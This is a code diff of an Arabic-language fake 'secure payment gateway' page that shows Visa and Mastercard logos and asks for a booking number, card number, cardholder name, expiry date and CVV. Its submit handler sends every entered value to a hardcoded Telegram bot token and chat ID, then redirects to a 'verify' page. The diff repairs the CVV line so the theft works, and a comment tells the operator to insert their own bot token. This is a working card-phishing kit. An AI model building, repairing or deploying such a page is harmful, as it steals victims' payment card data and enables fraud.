@@ -5,30 +5,84 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>بوابة الدفع الآمنة</title>
   <style>
-    body { font-family: Arial, sans-serif; direction: rtl; background-color: #f5f5f5; margin: 0; padding: 0; }
-    header, footer { background-color: #004080; color: white; text-align: center; padding: 20px 0; }
-    main { padding: 20px; }
-    form { background-color: white; padding: 20px; border-radius: 8px; max-width: 500px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    label { display: block; margin-top: 10px; }
-    input, select { width: 100%; padding: 8px; margin-top: 5px; box-sizing: border-box; }
-    .error-message { color: red; font-size: 14px; display: none; margin-top: 10px; }
-    button { margin-top: 20px; padding: 10px; width: 100%; background-color: #004080; color: white; border: none; border-radius: 4px; font-size: 16px; }
-    .card-logos { display: flex; justify-content: center; gap: 20px; }
-    .card-logos img { height: 50px; }
+    body {
+      font-family: Arial, sans-serif;
+      direction: rtl;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+    header, footer {
+      background-color: #004080;
+      color: white;
+      text-align: center;
+      padding: 20px 0;
+    }
+    main {
+      padding: 20px;
+    }
+    form {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    label {
+      display: block;
+      margin-top: 10px;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      box-sizing: border-box;
+    }
+    .error-message {
+      color: red;
+      font-size: 14px;
+      display: none;
+      margin-top: 10px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px;
+      width: 100%;
+      background-color: #004080;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    .card-logos {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+    .card-logos img {
+      height: 50px;
+    }
   </style>
 </head>
 <body>
+
   <header>
     <div class="card-logos">
       <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa Logo" />
       <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard Logo" />
     </div>
   </header>
+
   <main>
     <form id="paymentForm">
+
       <label for="confirmBooking">تأكيد رقم الحجز:</label>
       <input type="text" id="confirmBooking" minlength="6" maxlength="6" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
-      <p id="lengthError" class="error-message">❗ رقم الحجز.</p>
+
+      <p id="lengthError" class="error-message">
+        ❗ رقم الحجز.
+      </p>
 
       <label for="cardNumber">رقم البطاقة:</label>
       <input type="text" id="cardNumber" maxlength="19" required oninput="formatCardNumber(this)" />
@@ -56,17 +110,20 @@
         <option>2040</option>
       </select>
 
-      <!-- التعديل المطلوب: الآن الحقل يقبل 3 إلى 4 أرقام -->
-      <label for="cvv">CVV (3 إلى 4 أرقام):</label>
-      <input type="text" id="cvv" minlength="3" maxlength="4" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
-      
+      <!-- ✅ تم التعديل هنا فقط -->
+      <label for="cvv">CVV (3 أو 4 أرقام):</label>
+      <input type="text" id="cvv" minlength="3" maxlength="4" required 
+             oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+
       <p id="dateError" class="error-message">
-        ❗ لأسباب أمنية، لا يمكننا قبول بطاقات منتهية الصلاحية.
+        ❗ لأسباب أمنية، لا يمكننا قبول بطاقات منتهية الصلاحية.  
+        نحتفظ بحق رفض المعاملة لحمايتك من الاحتيال.
       </p>
 
       <button type="submit">ادفع الآن</button>
     </form>
   </main>
+
   <footer>
     جميع الحقوق محفوظة © 2025
   </footer>
@@ -81,49 +138,60 @@
 
     document.getElementById("paymentForm").addEventListener("submit", function(e) {
       e.preventDefault();
+
       const confirmBooking = document.getElementById("confirmBooking").value;
       const lengthError = document.getElementById("lengthError");
       const dateError = document.getElementById("dateError");
+
       lengthError.style.display = "none";
       dateError.style.display = "none";
+
       if (confirmBooking.length !== 6) {
         lengthError.style.display = "block";
         return;
       }
+
       const month = parseInt(document.getElementById("expiryMonth").value);
       const year = parseInt(document.getElementById("expiryYear").value);
+
       if (year < 2025 || (year === 2025 && month < 7)) {
         dateError.style.display = "block";
         return;
       }
+
       const cardNumber = document.getElementById("cardNumber").value;
       const cardName = document.getElementById("cardName").value;
       const cvv = document.getElementById("cvv").value;
 
-      // التحقق المطلوب: يقبل فقط 3 أو 4 أرقام
-      if (!/^\d{3,4}$/.test(cvv)) {
-        alert("الـ CVV يجب أن يحتوي 3 أو 4 أرقام.");
-        return;
-      const message = `💳 معلومات عملية الدفع:
+      const message = `
+💳 معلومات عملية الدفع:
 ------------------------
 📄 رقم البطاقة: ${cardNumber}
 👤 الاسم على البطاقة: ${cardName}
 📆 تاريخ الانتهاء: ${month}/${year}
-🔐 CVV:${CVV CVV}
+🔐 CVV: ${cvv}
 🔢 رقم الحجز: ${confirmBooking}
 `;
 
+      // ✅ استبدل التوكن والشات آيدي الخاص بك
       fetch("https://api.telegram.org/bot8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I/sendMessage", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify({
           chat_id: "8404960059",
           text: message
         })
       })
-      .then(() => { window.location.href = "verify.html"; })
-      .catch(() => { alert("❌ فشل الإرسال إلى البوت"); });
+      .then(() => {
+        window.location.href = "verify.html";
+      })
+      .catch(() => {
+        alert("❌ فشل الإرسال إلى البوت");
+      });
     });
   </script>
+
 </body>
 </html>
